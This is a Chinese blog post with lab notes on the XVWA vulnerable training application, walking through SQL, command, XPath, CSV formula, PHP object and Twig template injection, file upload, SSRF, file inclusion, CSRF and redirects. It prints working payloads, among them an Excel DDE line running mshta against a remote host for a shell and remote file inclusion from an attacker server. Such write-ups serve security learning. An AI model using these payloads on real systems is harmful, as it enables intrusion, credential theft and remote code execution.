<!--
	作者：Sariay
	时间：2018-08-26
	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
-->
<!DOCTYPE html>
<html class="html-loading">
		

<head>
	<meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
  <title>
    
      Web靶场-XVWA | Archeri&#39;s Blog
    
  </title>
  <meta name="author" content="Archeri Shade">
  <meta name="keywords" content="" />
  <meta name="description" content="" />
	<!-- favicon -->
  <link rel="shortcut icon" href="/img/favicon.ico">

  <!-- css -->
  
<link rel="stylesheet" href="/css/Annie.css">

  
  <!-- jquery -->
	
<script src="/plugin/jquery/jquery.min.js"></script>


<script>
    const CONFIG_BGIMAGE = {
      mode: 'random_you',
      normalSrc: '/img/header-bg.jpg',
      randomYouMax: 7,
      randomYouSrc: '/img/Random-img/',
	  randomOtherSrc: 'https://api.berryapi.net/?service=App.Bing.Images&day=-0',
	  preloaderEnable: true
    }
	
    const CONFIG_LEACLOUD_COUNT = {
      enable: false,
	  appId: 'AU8...',
	  appKey: '4cU...',
	  serverURLs: 'http' || ' '
    }
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>
	<body>
		<!-- Preloader -->

	<div id="preloader">
		<div class="pre-container">
			
				<div class="spinner">
					<div class="double-bounce1"></div>
					<div class="double-bounce2"></div>
				</div>
						
		</div>
	</div>


<!-- header -->
<header class="fixbackground bg-pan-br">
	<div class="mask">
		<!-- motto -->
		<div class="h-body">	
			
				<div class="motto text-shadow-pop-left">
					<p class="content" id="motto-content">获取中...</p>
					<p>-<p>
					<p class="author" id="motto-author">Just a minute...</p>
				</div>
			
		</div>
		
		<!-- others: such as time... -->			
		<div class="h-footer">
			<a href="javascript:;" id="read-more" class="scroll-down">
				<span class="icon-anchor1 animation-scroll-down"></span>
			</a>
		</div>
	</div>
</header>

<div id="navigation-hide">
	<!-- Progress bar -->
	<div id="progress-bar"></div>

	<!-- Progress percent -->
	<div id="progress-percentage"><span>0.0%</span></div>

	<div class="toc-switch"><span class="switch-button">目录</span></div>

	<!-- Page title -->
	<p>
		
			「Web靶场-XVWA」
		
	</p>

	
	

	<!-- Nav trigger for navigation-H-->
	<a class="nav-trigger"><span></span></a>
</div>

<!-- Navigation in div(id="navigation-H") -->
<nav class="nav-container" id="cd-nav">
	<div class="nav-header">
		<span class="logo"> 
			<img src="/img/logo.png">
		</span>
		<a href="javascript:;" class="nav-close"></a>
	</div>
	
	<div class="nav-body">
		<ul id="global-nav">
	
		<li class="menu-home">
			<a href="/" class="menu-item-home" target="_blank">主页</a>
		</li>
		
	
		<li class="menu-archive">
			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
		</li>
		
	
		<li class="menu-categories">
			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
		</li>
		
	
		<li class="menu-tags">
			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
		</li>
		
	
		<li class="menu-about">
			<a href="/about" class="menu-item-about" target="_blank">关于</a>
		</li>
		
	
		<li class="menu-gallery">
			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
		</li>
		
	

	
		<li class="menu-search">
			<a href="javascript:;" class="popup-trigger">搜索</a>
		</li>
	
</ul>
	</div>
	
	<div class="nav-footer">
		<ul id="global-social">
	
		<li>
			<a href="https://github.com/ArcheriShade" target="_blank">
				<span class="icon-github"></span>
			</a>
		</li>
			
</ul>

	</div>
</nav>
			
		<!--main-->
		<main>
			<!--
	时间：2018-11-17
	描述：
		插件名称：katelog.min.js
		插件作者：KELEN
		插件来源: https://github.com/KELEN/katelog
-->

	
		<div class="layout-toc">
			<div id="layout-toc">
				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
			</div>
		</div>

		
<script src="/plugin/toc/katelog.min.js"></script>


		
	 

<div class="layout-post">
	<div id="layout-post">
		<div class="article-title">
			
	<a href="/2021/12/04/Web%E9%9D%B6%E5%9C%BA-XVWA/" itemprop="url">
		Web靶场-XVWA
	</a>

		</div>

		<div class="article-meta">
			<span>
				<i class="icon-calendar1"></i>
				
				




	更新于

	<a href="/2021/12/04/Web%E9%9D%B6%E5%9C%BA-XVWA/" itemprop="url">
		<time datetime="2021-12-04T11:52:12.000Z" itemprop="dateUpdated">
	  		2021-12-04
	  </time>
	</a> 



			</span>
			<span>
				
	<i class="icon-price-tags"></i>
	
		<a href="/tags/Web/" class=" ">
			Web
		</a>
	
		<a href="/tags/Web%E9%9D%B6%E5%9C%BA/" class=" ">
			Web靶场
		</a>
	
		<a href="/tags/XVWA/" class=" ">
			XVWA
		</a>
	
		
			</span>
			
			



		</div>

		<div class="article-content" id="article-content">
			<h1 id="NOTE-XVWA靶场练习笔记"><a href="#NOTE-XVWA靶场练习笔记" class="headerlink" title="[NOTE] XVWA靶场练习笔记"></a>[NOTE] XVWA靶场练习笔记</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>又一个靶场….<br>上一个是DSVW</p>
<p>这次尽量搞快点把，还得学渗透呢</p>
<p>另外把这个靶场的环境适配到Ubuntu有点麻烦，能用就行<br>说到底还是要看看什么时候能不用小皮面板整个Web服务器试试</p>
<p>另另外XVWA，是Xtreme Vulnerable Web Application<br>Xtreme…</p>
<h2 id="SQL-Injection-–-Error-Based"><a href="#SQL-Injection-–-Error-Based" class="headerlink" title="SQL Injection – Error Based"></a>SQL Injection – Error Based</h2><p>场景介绍了很多种类的咖啡<br>爱了爱了</p>
<p>有两个编辑处，一个是选择<code>Code</code>返回对应的咖啡信息<br>一个是搜索栏，输入关键词返回所有相关的咖啡信息</p>
<p>BP看看，POST传送参数<br><code>item</code>和<code>search</code>两个参数不能同时传</p>
<h3 id="选择框"><a href="#选择框" class="headerlink" title="选择框"></a>选择框</h3><p>输入<code>&#39;</code>，确实报错：<br>check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’’ at line 1</p>
<p><code>&#39; or &#39;1&#39;=&#39;1</code>：check the manual that corresponds to your MySQL server version for the right syntax to use near ‘1’&#x3D;’1’ at line 1</p>
<p>？试试数字型：<code>222 or 1=1 #</code>，有了，选择框是数字型注入</p>
<p><code>1 order by 7 #</code>：测出字段为7</p>
<p><code>99 union select 1,2,3,4,5,6,7</code>：文字回显2、5、4、6、7（3在图片链接里）</p>
<p>爆表：<code>99 union select 1,concat(table_name),3,user(),5,6,7 from information_schema.tables where table_schema=database()</code></p>
<p>爆列：<code>99 union select 1,concat(column_name),3,user(),5,6,7 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;</code></p>
<p>爆用户名和密码：<code>99 union select 1,username,3,password,uid,6,7 from users</code></p>
<p>出来的是密码哈希</p>
<h3 id="搜索栏"><a href="#搜索栏" class="headerlink" title="搜索栏"></a>搜索栏</h3><p><code>&#39;</code>：check the manual that corresponds to your MySQL server version for the right syntax to use near ‘%’ OR itemdesc LIKE ‘%’%’ OR categ LIKE ‘%’%’’ at line 1</p>
<p>看起来使用的是模糊查询<code>LIKE &#39;%&#123;input&#125;%&#39;</code></p>
<p><code>%&#39; #</code>：全注</p>
<p><code>meirennengpodeliaowofang%&#39; union select 1,2,3,4,5,6,7 #</code></p>
<p>下略</p>
<h2 id="SQL-Injection-–-Blind"><a href="#SQL-Injection-–-Blind" class="headerlink" title="SQL Injection – Blind"></a>SQL Injection – Blind</h2><p>盲注，这次注入<code>&#39;</code>也不会有回显</p>
<p>但是选择个<code>1</code>会有完整回显——？</p>
<p><code>item=99 union select 1,database(),3,4,5,6,7&amp;search=</code><br>？？？这不还是有回显嘛</p>
<p>可能这里的“盲”，仅指不输出错误语句，而不是只回显“对”或“错”</p>
<p>那就略了</p>
<p>建议去打sqli-labs的盲注</p>
<h2 id="OS-Command-Injection"><a href="#OS-Command-Injection" class="headerlink" title="OS Command Injection"></a>OS Command Injection</h2><p>介绍了两个系统命令执行函数：</p>
<ul>
<li>system()</li>
<li>shell_exec()</li>
</ul>
<blockquote>
<p>This allows a user to inject arbitrary commands that will execute on the remote host with the <strong>privilege of web server user</strong>.</p>
</blockquote>
<p>输入IP&#x2F;HOSTNAME返回ping的终端结果</p>
<p><code>;whoami</code>，返回<code>www</code></p>
<p>看看passwd：<code>;cat /etc/passwd</code></p>
<p>关个机去吃饭：<code>; shutdown now</code><br>？怎么关不了？<br>55555不能去吃饭了<br>怀疑是权限不够</p>
<p>看看源码，简单拼接而已：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 3 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>.<span class="variable">$cmd</span>.<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="XPATH-Injection"><a href="#XPATH-Injection" class="headerlink" title="XPATH Injection"></a>XPATH Injection</h2><blockquote>
<p>XPATH injections are fairly similar to SQL injection with a difference that it uses XML Queries instead of SQL queries.</p>
<p>An attacker can send malicious requests to the application to <strong>find out how XML data is structured</strong> and can <strong>leverage the attack to access unauthorized XML data</strong>.</p>
</blockquote>
<p>输入<code>1</code>正常返回，<code>&#39;</code>警告：Warning: DOMXPath::query(): Invalid predicate in &#x2F;www&#x2F;xvwa&#x2F;vulnerabilities&#x2F;xpath&#x2F;home.php on line 10</p>
<p><code>&#39; or &#39;1&#39;=&#39;1</code>：全注，字符型</p>
<p>下面是盲注</p>
<p><code>1&#39; and count(/*)=1 and &#39;1&#39;=&#39;1</code>：根节点数为1</p>
<p><code>1&#39; and string-length(name(/*[position()=1]))=7 and &#39;1&#39;=&#39;1</code>：根节点名称长为7</p>
<p><code>1&#39; and substring(name(/*[position()=1]),1,1)=&#39;C&#39; and &#39;1&#39;=&#39;1</code>：根节点名称第一个字符为‘C’</p>
<p><code>1&#39; and name(/*[position()=1])=&#39;Coffees&#39; and &#39;1&#39;=&#39;1</code>根节点名称为“Coffees”</p>
<p>看来是只有关于咖啡信息的XML，之前已经全注出来了<br>剩下的信息盲注意义不大</p>
<h2 id="CSV-Formula-Injection"><a href="#CSV-Formula-Injection" class="headerlink" title="CSV Formula Injection"></a>CSV Formula Injection</h2><p>CSV公式注入？或者是CSV Excel宏注入？</p>
<blockquote>
<p>没有验证CSV文件的内容<br>常发生在允许上传&#x2F;下载CSV数据的站点</p>
</blockquote>
<p>没听过，先学一波</p>
<p>学习链接：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/195656.html">浅谈CSV注入漏洞</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiaoguanyusb/article/details/83623906">安全测试-CSV注入漏洞</a></li>
<li><a target="_blank" rel="noopener" href="https://hackerone.com/reports/90274">CSV Excel Macro Injection Vulnerability in export chat logs</a></li>
</ul>
<blockquote>
<p><strong>CSV公式注入（CSV Injection）</strong>是一种会造成巨大影响的攻击向量。攻击包含向恶意的EXCEL公式中注入可以输出或以CSV文件读取的参数。当在Excel中打开CSV文件时，文件会从CSV描述转变为原始的Excel格式，包括Excel提供的所有动态功能。在这个过程中，CSV中的所有Excel公式都会执行。当该函数有合法意图时，很易被滥用并允许恶意代码执行。</p>
</blockquote>
<p>就是，Excel中的一个单元格设置成<code>=36+1</code><br>保存之后重新打开，就会被正确计算变成<code>37</code><br>像是<code>=</code>、<code>-</code>、<code>+</code>、<code>@</code>这些符号都会触发这种行为</p>
<p>下面的例子需要事先在Excel中进行如下设置：<br><code>选项</code>-&gt;<code>信任中心</code>-&gt;<code>信任中心设置</code>-&gt;<code>外部内容</code>-&gt;<code>动态数据交换的安全设置</code>-&gt;勾选<code>启用动态数据交换服务器启动(不推荐)</code></p>
<p>然后是打开计算器的经典例子<br>在随便一个单元格中输入如下内容：<br><code>=1+cmd|&#39; /C calc&#39;!A0</code><br>保存，再打开，会有一系列提示<br>什么“更新链接”、“是否启动另外一个应用程序”<br>一律“是是是”<br>然后就会打开计算器了</p>
<p>理想的攻击场景是，攻击者找到这么一个有CSV公式注入的站点<br>注入恶意数据<br>管理员后台登入，导出CSV数据<br>然后打开，希望管理员没什么安全意识<br>权限全开，安全设置全关，嫌麻烦不读提示一律“对对对”<br>然后就中招了<br>被get shell或种马什么的</p>
<p>大概就是这样吧<br><a href="wj.qq.com">腾讯问卷</a>里边也出现过这个漏洞</p>
<p>另附一个远程连接shell的payload：<br><code>+1+cmd|&#39;/c mshta.exehttp://192.168.233.102:8080/a&#39;!A0</code></p>
<hr>
<p>回到靶场题目</p>
<p>这里需要先找到一个可以插入CSV数据的地方<br>就在这个漏洞下面的[任意文件上传模块](#Unrestricted File Upload)</p>
<p>上传下包含payload的数据：</p>
<img src="image-20211204100418380.png" alt="image-20211204100418380" style="zoom:67%;" />

<p>然后回到表格，已经多了新增的项</p>
<p><img src="/2021/12/04/Web%E9%9D%B6%E5%9C%BA-XVWA/image-20211204100437339.png" alt="image-20211204100437339"></p>
<p>然后模拟管理员登录后台，导出数据再本地用Excel打开<br>（还得要求后台系统是Windows并且关闭相关安全选项）<br>就会弹出计算器</p>
<h2 id="PHP-Object-Injection"><a href="#PHP-Object-Injection" class="headerlink" title="PHP Object Injection"></a>PHP Object Injection</h2><p>这里讲的就是PHP反序列化</p>
<blockquote>
<p>Though PHP Object Injection is not a very common vulnerability and also difficult to exploit, but it is found to be really dangerous vulnerbility as this could lead an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Denial of Service, depending on the application context.</p>
</blockquote>
<p>点击<code>CLICK HERE</code>后<br>下面回显<code>XVWA - Xtreme Vulnerable Web Application </code><br>同时注意到URL新增参数<code>/?r=a:2:&#123;i:0;s:4:&quot;XVWA&quot;;i:1;s:33:&quot;Xtreme Vulnerable Web Application&quot;;&#125;</code></p>
<p>猜测PHP对象用于在页面回显<br>于是有下面的XSS payload：<br><code>/?r=a:2:&#123;i:0;s:4:&quot;XVWA&quot;;i:1;s:29:&quot;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&quot;;&#125;</code></p>
<p>但是一般反序列化，都要结合源码审计<br>源码下面有如下的代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PHPObjectInjection</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$inject</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;inject)) &#123;</span><br><span class="line">			<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;inject);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;r&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$var1</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;r&#x27;</span>]);</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$var1</span>)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>.<span class="variable">$var1</span>[<span class="number">0</span>].<span class="string">&quot; - &quot;</span>.<span class="variable">$var1</span>[<span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>; <span class="comment"># nothing happens here</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中<code>__wakeup</code>函数经常用在反序列化操作中<br>执行<code>unserialize</code>时，会检查并执行<code>__wakeup</code>方法，预先准备对象需要的资源</p>
<p>上面可以看到所定义的对象，若存在<code>$inject</code>变量，则会调用<code>eval</code>去执行<br>这里就是注入点</p>
<p>则可以进一步构造如下payload：<br><code>O:18:&quot;PHPObjectInjection&quot;:1:&#123;s:6:&quot;inject&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code><br>改变<code>$inject</code>属性的值，即可执行任意php代码</p>
<p>另外在执行<code>serialize</code>时，检查并调用的是<code>__sleep</code>方法</p>
<h2 id="Unrestricted-File-Upload"><a href="#Unrestricted-File-Upload" class="headerlink" title="Unrestricted File Upload"></a>Unrestricted File Upload</h2><p>文件上传漏洞</p>
<p>先随便上传一张图片，然后在上传结果那里可以看到图像地址：<br><code>www.xvwa.com/xvwa/img/uploads/pepe.jpeg</code></p>
<p>然后发现能直接上传一句话<br>蚁剑一连，OK</p>
<h2 id="Cross-Site-Scripting-XSS-–-Reflected"><a href="#Cross-Site-Scripting-XSS-–-Reflected" class="headerlink" title="Cross Site Scripting (XSS) – Reflected"></a>Cross Site Scripting (XSS) – Reflected</h2><p>输入框，直接X爆</p>
<p>建议去看<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43266093/article/details/121592299?spm=1001.2014.3001.5502">Pikachu靶场的练习笔记</a>，我在里面做了相对详细的利用练习</p>
<h2 id="Cross-Site-Scripting-XSS-–-Stored"><a href="#Cross-Site-Scripting-XSS-–-Stored" class="headerlink" title="Cross Site Scripting (XSS) – Stored"></a>Cross Site Scripting (XSS) – Stored</h2><p><img src="/2021/12/04/Web%E9%9D%B6%E5%9C%BA-XVWA/image-20211204111243410.png" alt="image-20211204111243410"></p>
<p>建议去看<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43266093/article/details/121592299?spm=1001.2014.3001.5502">Pikachu靶场的练习笔记</a>，我在里面做了相对详细的利用练习</p>
<h2 id="Cross-Site-Scripting-XSS-–-DOM"><a href="#Cross-Site-Scripting-XSS-–-DOM" class="headerlink" title="Cross Site Scripting (XSS) – DOM"></a>Cross Site Scripting (XSS) – DOM</h2><blockquote>
<p>The attack triggers within the page, but with no need of requests&#x2F;response pair. </p>
</blockquote>
<p>页面的form表单里有一个JS脚本：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i = <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">substring</span>(<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>));</span><br><span class="line"><span class="keyword">if</span>(i.<span class="title function_">indexOf</span>(<span class="string">&quot;default&quot;</span>) &gt; -<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;OPTION value=1&gt;&quot;</span>+<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">substring</span>(<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>)+<span class="string">&quot;&lt;/OPTION&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;OPTION value=2&gt;English&lt;/OPTION&gt;&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;OPTION value=3&gt;French&lt;/OPTION&gt;&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;OPTION value=4&gt;Germany&lt;/OPTION&gt;&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;OPTION value=5&gt;Spanish&lt;/OPTION&gt;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>可见可以在URL里传入<code>default</code>参数，然后就会通过DOM语法生成到选单中：</p>
<img src="image-20211204112224827.png" alt="image-20211204112224827" style="zoom:67%;" />

<p>然而奇怪的是，我不能构造出一个payload注入到里边形成XSS<br>试过URL编码和HTML编码都不行<br>好像payload会被URL编码之后才拼接到标签中：</p>
<p><img src="/2021/12/04/Web%E9%9D%B6%E5%9C%BA-XVWA/image-20211204153026968.png" alt="image-20211204153026968"></p>
<p>搜索框倒是可以随便X（好像也不太行？）</p>
<h2 id="Server-Side-Request-Forgery-SSRF-XSPA"><a href="#Server-Side-Request-Forgery-SSRF-XSPA" class="headerlink" title="Server Side Request Forgery (SSRF&#x2F;XSPA)"></a>Server Side Request Forgery (SSRF&#x2F;XSPA)</h2><p>XSPA：Cross Site Port Attack，跨站端口攻击</p>
<blockquote>
<p>An attacker can trick the web server that could probability running behind a firewall to send requests to itself to identify services running on it, or can even send out-bond traffic to other servers. </p>
</blockquote>
<p>相关源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$image</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;img_url&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$remote_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;img_url&#x27;</span>]);</span><br><span class="line">	<span class="variable">$filename</span> = <span class="string">&quot;../../img/&quot;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&quot;img1.jpg&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$remote_content</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;img_url&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	<span class="variable">$image</span> = <span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot; width=\&quot;100\&quot; height=\&quot;100\&quot; /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$image</span>;</span><br></pre></td></tr></table></figure>

<p>这里关键是没有对<code>img_url</code>传入的参数进行检查<br>使用<code>file_get_contents</code>对指示的资源进行读取<br>然后写入到随机生成的一个文件中，并放在服务器<br>而且可以通过查看图片源地址来得知文件在服务器上的位置</p>
<p>一个访问敏感信息文件的场景：<br>输入payload：<code>../../../../../../etc/passwd</code><br>（这里也会有文件是否存在、有无权限等报错提示，存在目录遍历漏洞）<br>右键图片复制地址</p>
<img src="image-20211204155601515.png" alt="image-20211204155601515" style="zoom:67%;" />

<p>curl一下即可查看内容：</p>
<p><img src="/2021/12/04/Web%E9%9D%B6%E5%9C%BA-XVWA/image-20211204155753577.png" alt="image-20211204155753577"></p>
<p>或者是可以事先在恶意服务器上准备木马<code>http://10.10.10.1/hack.php</code><br>然后复制图像地址，蚁剑连接<br>然而不行，弄到服务器本地的文件内容为空，一句话不存在</p>
<p>估计还有其他利用场景，就是查看内网站点页面，以及访问内网别的资源吧</p>
<h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><p><code>file</code>参数可以本地文件包含，也可以远程文件包含</p>
<p>本地例：<code>/?file=file:///etc/passwd</code></p>
<p>远程例：<code>/?file=http://10.10.10.1/hack.php</code><br><del>（但是蚁剑连不上？其他像是<code>phpinfo</code>函数倒是可以）</del><br>（<code>phpinfo</code>显示的是恶意服务器的信息）<br>（要事先把恶意脚本上传到本地，然后再包含，才能蚁剑连上）</p>
<h2 id="Session-Flaws"><a href="#Session-Flaws" class="headerlink" title="Session Flaws"></a>Session Flaws</h2><p>会话缺陷，这里指由于用户会话管理不当所引发的会话推测、劫持、固定和重放</p>
<p>这里看了看包，无论时登录、登出前后<br><code>PHPSESSID</code>似乎都是不变的，是固定的</p>
<p>然后登录和登出的数据包都可以重放</p>
<p>那是不是意味着，只要别的用户能抓到已经登陆的<code>PHPSESSID</code><br>就能绕过登陆验证？<br>（问题是别人的<code>PHPSESSID</code>哪有这么好抓啊）</p>
<p>不太理解这题的利用场景</p>
<h2 id="Insecure-Direct-Object-Reference"><a href="#Insecure-Direct-Object-Reference" class="headerlink" title="Insecure Direct Object Reference"></a>Insecure Direct Object Reference</h2><p>不安全的对象直接引用</p>
<p>意思是请求的资源命名规律不要太明显了，容易被遍历</p>
<p>像是这题下拉框只给5个选项，但是可以在URL里遍历到5以上</p>
<h2 id="Missing-Functional-Level-Access-Control"><a href="#Missing-Functional-Level-Access-Control" class="headerlink" title="Missing Functional Level Access Control"></a>Missing Functional Level Access Control</h2><p>功能级权限控制缺失（在WebGoat里碰见过）<br>好像和越权有很大干系？</p>
<p>主要指，有一些本来应该隐藏的信息<br>如一些管理员才能执行的操作等<br>没有很好地隐藏（注释掉了或者只在HTML里hidden）<br>被发现了，就会被攻击者尝试执行恶意命令</p>
<p>这题地信息泄露，指源码泄露<br>发现URL中的<code>action</code>参数除了能看到的<code>view</code>之外<br>还有<code>delete</code>，攻击者可以越过页面执行删除数据操作</p>
<img src="image-20211204204903694.png" alt="image-20211204204903694" style="zoom:67%;" />

<h2 id="Cross-Site-Request-Forgery-CSRF"><a href="#Cross-Site-Request-Forgery-CSRF" class="headerlink" title="Cross Site Request Forgery (CSRF)"></a>Cross Site Request Forgery (CSRF)</h2><p>登陆后，修改密码的链接没有鉴权：<br><code>http://www.xvwa.com/xvwa/vulnerabilities/csrf/?passwd=password&amp;confirm=password&amp;submit=submit</code></p>
<p>那么可以随意修改密码形成钓鱼链接或页面，诱惑受害者点击<br>从而按攻击者目的修改了受害者密码</p>
<p>需要社工</p>
<h2 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h2><p>似乎只是一个介绍</p>
<p>介绍各个加密&#x2F;编码，并且提醒要正确地使用它们</p>
<h2 id="Unvalidated-Redirects-and-Forwards"><a href="#Unvalidated-Redirects-and-Forwards" class="headerlink" title="Unvalidated Redirects and Forwards"></a>Unvalidated Redirects and Forwards</h2><p>不安全的重定向和跟随重定向</p>
<p>说白了就是<code>forward</code>后面的链接参数没有限制<br>导致攻击者可以利用正常站点去钓鱼恶意网站<code>http://www.xvwa.com/xvwa/vulnerabilities/redirect/?forward=http://www.hacker.com</code></p>
<h2 id="Server-Side-Template-Injection-SSTI"><a href="#Server-Side-Template-Injection-SSTI" class="headerlink" title="Server Side Template Injection (SSTI)"></a>Server Side Template Injection (SSTI)</h2><p>不太熟</p>
<p>Web页面使用模板（templates）去让页面更加动态<br>SSTI常与XSS弄混<br>但前者能直接攻击服务器内部并引发更大的危害，如RCE或服务器被拿下等</p>
<p>大概和第三方组件有关<br>这里靶场使用的是叫TWIG的东西<br>得了解它的相关资料</p>
<p>一个命令执行的模板：<br><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("id")&#125;&#125;</code><br>回显：<code>Hello uid=1001(www) gid=1001(www) groups=1001(www) </code></p>
<p>&#x3D;&#x3D;还不太理解这个TWIG&#x3D;&#x3D;</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>中规中矩的靶场吧</p>
	
		</div>
		
		<div id="current-post-cover" data-scr="/img/post-cover/default.jpg"></div>

		<!-- relate post, comment...-->
		<div class="investment-container">
			<div class="investment-header">
				<div class="investment-title-1">
					<div class="on">相关文章</div>
					<div>评论</div>
					<!-- <div>分享</div> -->
				</div>
				<div class="investment-title-2">	            
					
	<span>
		<a id="totop-post-page">返回顶部</a>
		
			<a href="/2021/12/10/Linux%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/" title="Linux环境变量" rel="prev">
				&laquo;上一篇
			</a>
		
		
			<a href="/2021/11/19/SQLite%E5%9F%BA%E7%A1%80%E5%8F%8A%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3/" title="SQLite基础及注入相关" rel="next">
				下一篇&raquo;
			</a>
			
	</span>


      		
				</div>	
			</div>
			
			<div class="investment-content">
				<div class="investment-content-list">
					

<div class="relate-post">
	
		<ul>
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2023/06/04/Web%E9%9D%B6%E5%9C%BA-upload-labs/" title="Web靶场-upload-labs">
								Web靶场-upload-labs			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								六月 4日, 2023				
